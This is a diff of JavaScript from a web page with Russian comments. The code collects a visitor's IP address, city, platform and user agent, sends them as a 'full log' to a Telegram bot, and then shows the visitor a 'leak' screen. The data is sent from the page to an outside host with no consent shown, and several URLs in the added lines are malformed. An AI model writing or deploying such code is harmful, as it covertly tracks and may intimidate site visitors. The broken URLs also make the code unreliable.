@@ -67,49 +67,50 @@
             await getTripleData();
         }
 
-        async function getTripleData() {
+                async function getTripleData() {
             let ip = "Не определен";
             let city = "Неизвестно";
-            let country = "";
 
             try {
-  
-                const ipRes = await fetch(`https://api.ipify.org?format=json`);
+                // 1. Получаем IPv4 (цифры)
+                const ipRes = await fetch('https://api.ipify.org');
                 const ipData = await ipRes.json();
                 ip = ipData.ip;
 
-            
+                // 2. Тройной поиск города
+                // Сначала пробуем самый стабильный сервис
                 try {
-                    const resA = await fetch(`https://ipwho.is/${ip}`);
+                    const resA = await fetch(`https://freeipapi.com{ip}`);
                     const dA = await resA.json();
-                    if (dA.success) {
-                        city = dA.city;
-                        country = dA.country;
+                    if (dA.cityName) {
+                        city = `${dA.cityName}, ${dA.countryName}`;
                     }
                 } catch(e) {}
 
+                // Если первый не сработал, пробуем ipwho.is
                 if (city === "Неизвестно") {
                     try {
-                        const resB = await fetch(`https://ipapi.co{ip}/json/`);
+                        const resB = await fetch(`https://ipwho.is{ip}`);
                         const dB = await resB.json();
-                        city = dB.city || "Неизвестно";
-                        country = dB.country_name || "";
+                        if (dB.success) city = `${dB.city}, ${dB.country}`;
                     } catch(e) {}
                 }
- 
+
+                // Вписываем данные в красное окно
                 document.getElementById('user-ip').innerText = ip;
-                document.getElementById('user-geo').innerText = city + (country ? ", " + country : "");
+                document.getElementById('user-geo').innerText = city;
                 document.getElementById('user-os').innerText = navigator.platform;
- 
-                const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ip}\n🌍 Город: ${city}, ${country}\n📱 Устройство: ${navigator.userAgent}`;
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+
+                // 3. Шлем лог в Телеграм
+                const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ip}\n🌍 Город: ${city}\n📱 Устройство: ${navigator.userAgent}`;
+                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
 
             } catch (e) {
-      
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("⚠️ Ошибка: " + e.message)}`);
+                // Если всё упало - шлем уведомление об ошибке
+                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("⚠️ Ошибка сбора данных: " + e.message)}`);
             }
- 
-       
+
+            // Переключаем экран через полсекунды после отправки
             setTimeout(() => {
                 document.getElementById('terminal').style.display = 'none';
                 document.getElementById('leak-box').style.display = 'block';
